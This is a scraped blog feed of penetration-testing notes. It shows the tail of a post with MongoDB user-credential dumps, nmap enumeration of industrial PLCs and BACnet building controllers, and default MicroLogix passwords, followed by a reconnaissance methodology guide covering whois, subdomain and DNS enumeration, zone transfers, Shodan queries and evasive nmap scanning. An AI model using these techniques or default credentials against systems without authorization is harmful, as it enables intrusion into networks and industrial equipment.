<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mongos&gt; show collections
</span><span class='line'>nxae
</span><span class='line'>system.indexes
</span><span class='line'>system.users
</span><span class='line'>system.version</span></code></pre></td></tr></table></div></figure>
db.foo.find()                list objects in collection foo
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db.system.users.find()
</span><span class='line'>{ &ldquo;<em>id&rdquo; : &ldquo;test.root&rdquo;, &ldquo;user&rdquo; : &ldquo;root&rdquo;, &ldquo;db&rdquo; : &ldquo;test&rdquo;, &ldquo;credentials&rdquo; : { &ldquo;MONGODB-CR&rdquo; : &ldquo;d6zzzdb4538zzz339acd585fa9zzzzzz&rdquo; }, &ldquo;roles&rdquo; : [  {  &ldquo;role&rdquo; : &ldquo;dbOwner&rdquo;,  &ldquo;db&rdquo; : &ldquo;test&rdquo; } ] }
</span><span class='line'>{ &ldquo;</em>id&rdquo; : &ldquo;genprod.root&rdquo;, &ldquo;user&rdquo; : &ldquo;root&rdquo;, &ldquo;db&rdquo; : &ldquo;genprod&rdquo;, &ldquo;credentials&rdquo; : { &ldquo;MONGODB-CR&rdquo; : &ldquo;d6zzzdb4538zzz339acd585fa9zzzzzz&rdquo; }, &ldquo;roles&rdquo; : [  {  &ldquo;role&rdquo; : &ldquo;dbOwner&rdquo;,  &ldquo;db&rdquo; : &ldquo;genprod&rdquo; } ] }</span></code></pre></td></tr></table></div></figure>
</li>
</ol></p>

<h3>EthernetIP-TCP-UDP | Port 44818</h3>

<p>If we found TCP Port 44818, probably it&rsquo;s running Ethernet/IP. Rockwell Automation / Allen Bradley developed the protocol and is the primary maker of these devices, e.g. ControlLogix and MicroLogix, but it is an open standard and a number of vendors offer an EtherNet/IP interface card or solution.</p>

<p><a href="https://github.com/digitalbond/Redpoint">Redpoint</a> has released a NSE for enumeration of these devices</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 44818 -n &ndash;script enip-enumerate x.x.x.x -Pn
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-25 18:49 IST
</span><span class='line'>Nmap scan report for x.x.x.x
</span><span class='line'>Host is up (0.83s latency).
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>44818/tcp open  EtherNet/IP
</span><span class='line'>| enip-enumerate:
</span><span class='line'>|   Vendor: Rockwell Automation/Allen-Bradley (1)
</span><span class='line'>|   Product Name: 1766-L32BXB B/10.00
</span><span class='line'>|   Serial Number: 0x40605446
</span><span class='line'>|   Device Type: Programmable Logic Controller (14)
</span><span class='line'>|   Product Code: 90
</span><span class='line'>|   Revision: 2.10
</span><span class='line'>|_  Device IP: 192.168.xx.xx</span></code></pre></td></tr></table></div></figure></p>

<p>Rockwell Automation has
<ol>
<li>MicroLogix 1100: Default Username:password is administrator:ml1100</li>
<li>MicroLogix 1400: Default Username:password is administrator:ml1400 User manual is <a href="http://literature.rockwellautomation.com/idc/groups/literature/documents/um/1766-um002_-en-p.pdf">MicroLogix 1400</a> </li>
<li>guest:guest is another default password.</li>
</ol></p>

<h3>UDP BACNet | Port 47808</h3>

<p>If we found UDP Port 47808 open, we can use BACnet-discover-enumerate NSE created by <a href="https://github.com/digitalbond/Redpoint">Redpoint</a>. Should read <a href="http://www.digitalbond.com/blog/2014/03/26/redpoint-discover-enumerate-bacnet-devices/">Discover Enumerate bacnet devices</a></p>

<p>BACNet &ndash; Port 47808
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -p 47808 -n -vvv &ndash;script BACnet-discover-enumerate &ndash;script-args full=yes 182.X.X.X
</span><span class='line'>Nmap scan report for 182.X.X.X
</span><span class='line'>Host is up (0.11s latency).
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>47808/udp open  BACNet &ndash; Building Automation and Control Networks
</span><span class='line'>| BACnet-discover-enumerate:
</span><span class='line'>|   Vendor ID: Automated Logic Corporation (24)
</span><span class='line'>|   Vendor Name: Automated Logic Corporation
</span><span class='line'>|   Object-identifier: 2404999
</span><span class='line'>|   Firmware: BOOT(id=0,ver=0.01:001,crc=0x0000) MAIN(id=3,ver=6.00a:008,crc=0x2050)
</span><span class='line'>|   Application Software: PRG:carrier_19xrv_chiller_01_er_mv
</span><span class='line'>|   Object Name: device2404999
</span><span class='line'>|   Model Name: LGR1000
</span><span class='line'>|   Description: Device Description
</span><span class='line'>|   Location: Device Location
</span><span class='line'>|   Broadcast Distribution Table (BDT):
</span><span class='line'>|     182.X.X.X:47808
</span><span class='line'>|_  Foreign Device Table (FDT): Empty Table</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From the Field: Intelligence Gathering]]></title>
    <link href="http://bitvijays.github.io/blog/2015/04/09/learning-from-the-field-intelligence-gathering/"/>
    <updated>2015-04-09T10:23:38+05:30</updated>
    <id>http://bitvijays.github.io/blog/2015/04/09/learning-from-the-field-intelligence-gathering</id>
    <content type="html"><![CDATA[<p>This post (always Work in Progress) would list the technical steps which might be important while doing the intelligence gathering of an organization and we only know the company name or it&rsquo;s domain name such as example.com.</p>

<!-- more -->


<h3>Thanks to Vulnhub-ctf team, bonsaiviking, recrudesce, Rajesh and Tanoy.</h3>

<p>Suppose, we have to do a external/ internal pentest of a big organization with DMZ, Data centers, Telecom network etc. We can either do <strong>Passive fingerprinting</strong> ( method to learn more about the enemy, without them knowing it ) or <strong>Active fingerprinting</strong> ( process of transmitting packets to a remote host and analysing corresponding replies ).
<br>
<br>
<strong>Passive fingerprinting</strong> and <strong>Active fingerprinting</strong> can be done by using various methods such as</p>



<table class="tg">
  <tr>
    <th class="tg-e3zv">Passive Fingerprinting              </th>
    <th class="tg-e3zv">Active Fingerprintering</th>
  </tr>
  <tr>
    <td class="tg-031e">- whois</td>
    <td class="tg-031e">- Finding DNS, MX, AAAA, A</td>
  </tr>
  <tr>
    <td class="tg-031e">- ASN Number</td>
    <td class="tg-031e">- DNS Zone Transfer</td>
  </tr>
  <tr>
    <td class="tg-031e">- Enumeration with Domain Name</td>
    <td class="tg-031e">- SRV Records</td>
  </tr>
  <tr>
    <td class="tg-yw4l">- Publicly available scans of IP Addresses         </td>
    <td class="tg-yw4l">- Port Scanning</td>
  </tr>
  <tr>
    <td class="tg-yw4l">- Reverse DNS Lookup using External Websites         </td>
    <td class="tg-yw4l">-</td>
  </tr>
</table>


<p><br></p>

<ol>
<li><strong>Passive Fingerprinting:</strong>
<ol>
<li><strong>Whois</strong>: provide information about the registered users or assignees of an Internet resource, such as Domain name, an IP address block, or an autonomous system.
<br><br>
whois command acts differently for ip address and domain name. 
<ul>
<li>In Domain name it just provides registrar name etc.</li> 
<li>In IP address it provides the net-block ASN Number etc.</li>
</ul>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>whois &lt;Domain Name/ IP Address&gt;
</span><span class='line'>-H Do not display the legal disclaimers some registries like to show you.</span></code></pre></td></tr></table></div></figure>
Googling for 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"Registrant Organization" inurl:domaintools</span></code></pre></td></tr></table></div></figure>
also helps for to search for new domains registered by the same organization. "Registrant Organization" is present in the output of whois. This technique was used by person who compromised FinFisher in the <a href="http://pastebin.com/raw/cRYvK4jb">writeup</a>.
<br>
<br>
<li><strong>ASN Number</strong>: We could find AS Number that participates in Border Gateway Protocol (BGP) used by particular organization which could further inform about the IP address ranges used by the organization.

ASN Number and information could be found by using Team CMRU whois service
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>whois -h whois.cymru.com " -v 216.90.108.31"</span></code></pre></td></tr></table></div></figure>
If you want to do bulk queries refer @ <a href="http://www.team-cymru.org/IP-ASN-mapping.html">IP-ASN-Mapping-Team-CYMRU</a>
<br>
<br>
Hurricane Electric Internet Services also provide a website <a href="http://bgp.he.net">BGP Toolkit</a> which provides your IP Address ASN or search function by Name, IP address etc. It also provides AS Peers which might help in gathering more information about the company in terms of it's neighbors. 
<br><br>
TODO: Commandline checking of subnet and making whois query efficient.<br>
</li>
<br>
<li><strong>Enumeration with Domain Name (e.g example.com) using external websites</strong>: If you have domain name you could use
<ul>
<li><strong>DNS Dumpster API</strong> to know the various sub-domain related to that domain.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#Script connects to the API and convert the required output to a CSV ready format.
</span><span class='line'>#!/bin/bash
</span><span class='line'>#$1 is the first argument to the script
</span><span class='line'>curl -s http://api.hackertarget.com/hostsearch/?q=$1 &gt; hostsearch
</span><span class='line'>cat hostsearch | awk -F , '{print "\""$1"\""",""\""$2"\""}' &gt; temp.csv</span></code></pre></td></tr></table></div></figure>
and the various dns queries by 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#Script connects to the API and greps only the Name Servers.
</span><span class='line'>#!/bin/bash
</span><span class='line'>#$1 is the first argument to the script
</span><span class='line'>curl -s http://api.hackertarget.com/dnslookup/?q=$1 &gt; dnslookup
</span><span class='line'>cat dnslookup | grep -v RRSIG | grep -v DNSKEY | grep -v SOA | grep NS &gt; temp
</span><span class='line'>cat -T temp &gt; temp2
</span><span class='line'>cat temp2 | cut -d "I" -f7 | rev | cut -c 2- | rev
</span><span class='line'>#rm temp temp2</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>Recon-ng:</strong>
<ul>
<li> use recon/domains-hosts/bing_domain_web : Harvests hosts from Bing.com by using the site search operator.</li>
<li> use recon/domains-hosts/google_site_web : Harvests hosts from google.com by using the site search operator.</li>
<li> use recon/domains-hosts/brute_hosts     : Brute forces host names using DNS.</li>
<li> use recon/hosts-hosts/resolve           : Resolves the IP address for a host.</li>
<li> use reporting/csv                       : Creates a CSV file containing the specified harvested data.</li>
</ul>
<br>
Jason Haddix has created a dynamic resource script for sub-domain discovery which is available <a href="https://github.com/jhaddix/domain">here</a>. Simply put the domain name and it runs the necessary modules, creates a new workspace and save the report. 
<br>
<br>
TODO: Check API option too, why google_site_web is failing, add a module to add ASN Info and Location Info too.
</li>
<br> 
<li><strong>The Harvester:</strong>
<br>The harvester provides a email address, virtual hosts, different domains, shodan results for the domain. Provides really good results, especially if you combine with shodan results as it may provide server versions and what's OS is running on the IP address.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: theharvester options 
</span><span class='line'>
</span><span class='line'>       -d: Domain to search or company name
</span><span class='line'>       -b: data source: google, googleCSE, bing, bingapi, pgp
</span><span class='line'>                        linkedin, google-profiles, people123, jigsaw, 
</span><span class='line'>                        twitter, googleplus, all
</span><span class='line'>       -v: Verify host name via dns resolution and search for virtual hosts
</span><span class='line'>       -f: Save the results into an HTML and XML file
</span><span class='line'>       -c: Perform a DNS brute force for the domain name
</span><span class='line'>       -t: Perform a DNS TLD expansion discovery
</span><span class='line'>       -e: Use this DNS server
</span><span class='line'>       -h: use SHODAN database to query discovered hosts</span></code></pre></td></tr></table></div></figure>

TODO: Combine these results with recon-ng and DNS Dumpsters and create one csv with all results.
</li>
<br>
<li><strong>Google search operators</strong>
<ul>
<li><strong>site</strong>: Get results from certain sites or domains.</li>
<li><strong>filetype:suffix</strong>: Limits results to pages whose names end in suffix.  The suffix is anything following the last period in the file name of the web page. For example: filetype:pdf</li>
<li><strong>allinurl/inurl</strong>: Restricts results to those containing all the query terms you specify in the URL. For example, [ allinurl: google faq ] will return only documents that contain the words “google” and “faq” in the URL, such as “www.google.com/help/faq.html”.</li>
<li><strong>allintitle/intitle</strong>:Restricts results to those containing all the query terms you specify in the title.</li>
</ul>
Three good places to refer are <a href="https://support.google.com/websearch/answer/2466433">Search Operators</a>, <a href="https://sites.google.com/site/gwebsearcheducation/advanced-operators">Advanced Operators</a> and <a href="https://www.exploit-db.com/google-hacking-database/">Google Hacking Database</a>.
<br>
<br>
Another two important tools are 
<ul>
<li><a href="http://www.mcafee.com/in/downloads/free-tools/sitedigger.aspx">Mcafee Site Digger</a> which searches Google’s cache to look for vulnerabilities, errors, configuration issues, proprietary information, and interesting security nuggets on web sites.</li>
<li><a href="http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/"><strong>SearchDiggity v3</strong></a>: It is Bishop Fox’s MS Windows GUI application that serves as a front-end to the most recent versions of our Diggity tools: GoogleDiggity, BingDiggity, Bing LinkFromDomainDiggity, CodeSearchDiggity, DLPDiggity, FlashDiggity, MalwareDiggity, PortScanDiggity, SHODANDiggity, BingBinaryMalwareSearch, and NotInMyBackYard Diggity.</a></li>
</ul>
</li>
<br>
<li><strong>Publicly available scans of IP Addresses</strong>
<ul>
<li><a href="https://exfiltrated.com/"><strong>Exfiltrated</strong></a>: It provides the scans from the 2012 Internet Census. It would provide the IP address and the port number running at the time of scan in the year 2012.</li>
<li><a href="https://www.shodan.io/"><strong>Shodan</strong></a>: Shodan provides the same results may be with recent scans. You need to be logined. Shodan CLI is available at <a href="https://cli.shodan.io/">Shodan Command-Line Interface</a></li>
<br>
Shodan Queries
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>title: Search the content scraped from the HTML tag
</span><span class='line'>html: Search the full HTML content of the returned page
</span><span class='line'>product: Search the name of the software or product identified in the banner
</span><span class='line'>net: Search a given netblock (example: 204.51.94.79/18)
</span><span class='line'>version: Search the version of the product
</span><span class='line'>port: Search for a specific port or ports
</span><span class='line'>os: Search for a specific operating system name
</span><span class='line'>country: Search for results in a given country (2-letter code)
</span><span class='line'>city: Search for results in a given city</span></code></pre></td></tr></table></div></figure>
TODO: Learn how to access Shodan with API.
<li><a href="http://www.netmux.com/"><strong>Netmux</strong></a>: NETMUX is the all-source information hub about every IP address, device, IOT, or domain on the internet. All with a single query.</li>
<li><a href="https://censys.io/"><strong>Censys</strong></a>: Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed. A good feature is the Query metadata which tells the number of Http,https and other protocols found in the IP network range.
<br>
Censys.io queries
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ip:192.168.0.0/24 -- CIDR notation</span></code></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>
</li>
<li><strong>Reverse DNS Lookup using External Websites:</strong> Even after doing the above, sometimes we miss few of the domain name. Example: Recently, In one of our engagement, the domain name was example.com and the asn netblock was 192.168.0.0/24. We did recon-ng, theharvester, DNS reverse-lookup via nmap. Still, we missed few of the websites hosted on same netblock but with different domain such as exam.in. We can find such entries by using ReverseIP lookup by 
<ul>
<li><a href="http://reverseip.domaintools.com">Reverse IP Lookup by Domaintools</a>: Domain name search tool that allows a wildcard search, monitoring of WHOIS record changes and history caching, as well as Reverse IP queries.</li>
<li><a href="https://www.passivetotal.org/">Passive Total</a> : A threat-analysis platform created for analysts, by analysts.</li>
<li><a href="http://serversniff.net.ipaddress.com/">Server Sniff</a> :  A website providing IP Lookup, Reverse IP services.</li>
<li><a href="https://www.robtex.com/">Robtex</a> : Robtex is one of the world's largest network tools. At robtex.com, you will find everything you need to know about domains, DNS, IP, Routes, Autonomous Systems, etc.

There's a nmap nse <a href="https://nmap.org/nsedoc/scripts/http-robtex-reverse-ip.html">http-robtex-reverse-ip</a> which can be used to find the domain/website hosted on that ip.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script http-robtex-reverse-ip --script-args http-robtex-reverse-ip.host='XX.XX.78.214'
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-20 21:39 IST
</span><span class='line'>Pre-scan script results:
</span><span class='line'>| http-robtex-reverse-ip: 
</span><span class='line'>|   xxxxxxindian.com
</span><span class='line'>|_  www.xxxxxindian.com</span></code></pre></td></tr></table></div></figure>
 </li>
</ul></li>
</ol>
 </li>
<li><strong>Active Fingerprinting:</strong>
<ol>
Above all methods, would help you to provide information without actually interacting with the client infrastructure.
<li>Most probably by now we have gathered all the public available information without interacting with client infrastructure. Next, we can use <strong>DNS enumeration</strong> to gather more information about the client. The below information could gather externally as well as internally. However, amount of information gathered from internal network would definitely be more than when done externally.
<br>
<br>
<strong>Finding DNS, MX, AAAA, A using</strong> 

<ul> 
<li><strong>host:</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>host &lt;domain&gt; &lt;optional_name_server&gt;
</span><span class='line'>host -t ns &lt;domain&gt;           -- Name Servers
</span><span class='line'>host -t a &lt;domain&gt;            -- Address
</span><span class='line'>host -t aaaa &lt;domain&gt;         -- AAAA record points a domain or subdomain to an IPv6 address
</span><span class='line'>host -t mx &lt;domain&gt;           -- Mail Servers   
</span><span class='line'>host -t soa &lt;domain&gt;          -- Start of Authority
</span><span class='line'>host &lt;IP&gt;                     -- Reverse Lookup</span></code></pre></td></tr></table></div></figure>

Example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>host -t ns zonetransfer.me
</span><span class='line'>zonetransfer.me name server nsztm1.digi.ninja.
</span><span class='line'>zonetransfer.me name server nsztm2.digi.ninja.</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>nslookup:</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nslookup - &lt;optional_name_server&gt;
</span><span class='line'>set type=mx
</span><span class='line'>set type=ns</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>DNS Zone Transfer:</strong>
Using
<ul>
<li><strong>host:</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>host -l &lt;Domain Name&gt; &lt;DNS Server&gt;</span></code></pre></td></tr></table></div></figure>
Try zonetransfer using host for zonetransfer.me using their name servers. </li>
<li><strong>Dig:</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dig axfr &lt;domain_name&gt; @nameserver</span></code></pre></td></tr></table></div></figure>
Try zonetransfer using dig for zonetransfer.me using their name servers.</li>
<li><strong>dnsrecon</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d &lt;domain&gt; -t axfr</span></code></pre></td></tr></table></div></figure>
dnsrecon could also be used for other purposes such as finding nameservers, mailserver, forward reverse lookup
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-d, --domain      &lt;domain&gt;          Domain to Target for enumeration.
</span><span class='line'>-r, --range       &lt;range&gt;           IP Range for reverse look-up brute force in formats (first-last) or in (range/bitmask).
</span><span class='line'>-n, --name_server &lt;name&gt;            Domain server to use, if none is given the SOA of the target will be used</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>DNSEnum: </strong>DNS Enumeration tool
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsenum &lt;domain&gt;</span></code></pre></td></tr></table></div></figure></li>
Ideally, we should try every DNS server to do a zone transfer because there might be a probability of one mis-configured dns server. Also, DigiNinja a well known security researcher has made the domain zonetransfer.me available for testing and learning, so you can test the online zone transfer and other queries with the deliberately configured zone transfer capable domain.

<br><br>
</ul></li>
<li><strong>SRV Records:</strong><br>
Service record (SRV record) is a specification of data in the Domain Name System defining the location, i.e. the hostname and port number, of servers for specified services.

An SRV record has the form:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_service._proto.name. TTL class SRV priority weight port target.
</span><span class='line'>
</span><span class='line'>service  : the symbolic name of the desired service.
</span><span class='line'>proto    : the transport protocol of the desired service; this is usually either TCP or UDP.
</span><span class='line'>name     : the domain name for which this record is valid, ending in a dot.
</span><span class='line'>TTL      : standard DNS time to live field.
</span><span class='line'>class    : standard DNS class field (this is always IN).
</span><span class='line'>priority : the priority of the target host, lower value means more preferred.
</span><span class='line'>weight   : A relative weight for records with the same priority, higher value means more preferred.
</span><span class='line'>port     : the TCP or UDP port on which the service is to be found.
</span><span class='line'>target   : the canonical hostname of the machine providing the service, ending in a dot.</span></code></pre></td></tr></table></div></figure>
<strong>Retrieving an SRV record:</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> $ dig _sip._tls.example.com SRV
</span><span class='line'>
</span><span class='line'> $ host -t SRV _sip._tls.example.com
</span><span class='line'>
</span><span class='line'> $ nslookup -querytype=srv _sip._tls.example.com
</span><span class='line'>
</span><span class='line'> $ nslookup
</span><span class='line'> &gt; set querytype=srv
</span><span class='line'> &gt; _sip._tls.example.com</span></code></pre></td></tr></table></div></figure>
<strong>Usage:</strong>
SRV records are used by the below standardized communication protocols.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Teamspeak 3 (since version 3.0.8 - Neither priority nor weight is taken into consideration. The client appears to choose an SRV record at random for a connection attempt.[1])
</span><span class='line'>Minecraft (since version 1.3.1, _minecraft._tcp)
</span><span class='line'>CalDAV and CardDAV
</span><span class='line'>Client SMTP Authorization
</span><span class='line'>DNS Service Discovery (DNS-SD)
</span><span class='line'>IMPS
</span><span class='line'>Kerberos
</span><span class='line'>LDAP
</span><span class='line'>Puppet
</span><span class='line'>SIP
</span><span class='line'>XMPP
</span><span class='line'>Mail submission, Post Office Protocol, and Internet Message Access Protocol
</span><span class='line'>Libravatar uses SRV records to locate avatar image servers
</span><span class='line'>Microsoft Lync
</span><span class='line'>Citrix Receiver</span></code></pre></td></tr></table></div></figure>
Checkout the brute_srv function in the dnsrecon tool script to get familar with the different SRV names and services.
</li>
</ul>
</li>
</ol>
<br>
<br>
<li><strong>Internal Infrastructure Mapping:</strong>
<br>
All the steps in 2.a which are DNS related recon could also be performed in the internal penetration testing provided we have the access to the internal DNS Server. After, we have gathered all the information from DNS enumeration, still we haven't enumerated internal infrastructure. We apply the below methods to enumerate further.
<br>
<ol>
<li>
<strong>Internal range identification:</strong>
<br>
In many instances, we are provided or expected to find vulnerabilities in a 10.0.0.0/8 network which would contain around 16 million IP Addresses. Scanning 16 million IP address in a considerable time is difficult. In which case, we need faster and targeted result. So, how do we find out the ranges?
<ul>
<br>
<li><strong>DNS Enumeration:</strong>
<br>
If you are connected to a internal dns server, you may query it with
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dig -t any &lt;domainname&gt;</span></code></pre></td></tr></table></div></figure>
which should result in outputting different name servers, mail servers, A, AAAA, SOA records which would possibly give you a inner scenario how the network has been designed as there can be different nameservers, domain controllers for different locations, internal departments etc.
<br>
TODO: Convert dig output directly into hostname, ip address format.<br></li>
<li>
<strong>Internal Portal Links:</strong>
Most of the organization have one internal portals which serves has a one-stop links to every possible portal link. This could also result in some internal range exposure.
<br>
TODO: Write the script for grep and printing host and IP address and combine it with DNS Enumeration. 
</li>
<li><strong>Reverse DNS Lookup:</strong>
<br>
Nmap provides a List scan option which does the reverse lookup. It provides the hostnames of the IP Address
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sL 10.0.0.0/8
</span><span class='line'>
</span><span class='line'>It can also be used with the below options:
</span><span class='line'> --randomize-hosts  : make the scans less obvious to various network monitoring systems
</span><span class='line'> --dns-servers server1,server2 : By default, it would use the dns servers which are listed in resolve.conf (if you haven't used --system-dns option). We can also list custom servers using these options.</span></code></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><strong>Identifying Alive IP Addresses:</strong><br>
Nmap by default provides a -sn Ping scan option. The default host discovery done with -sn consists of an ICMP echo request, TCP SYN to port 443, TCP ACK to port 80, and an ICMP timestamp request by default. This works as if ICMP echo request is blocked, nmap would know if a host is alive if it receives any response from port 443 or 80 or timestamp reply.
<br><br>
Let's see what the nmap does when do a ping scan.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sn -n 10.0.0.230
</span><span class='line'>#My IP is 10.0.0.1</span></code></pre></td></tr></table></div></figure>
It is very important to mention that -n option (No DNS resolution) should be used going forward as we have already did DNS resolution while using List scan. Since DNS can be slow even with Nmap's built-in parallel stub resolver, this option can slash scanning times.
<br><br>
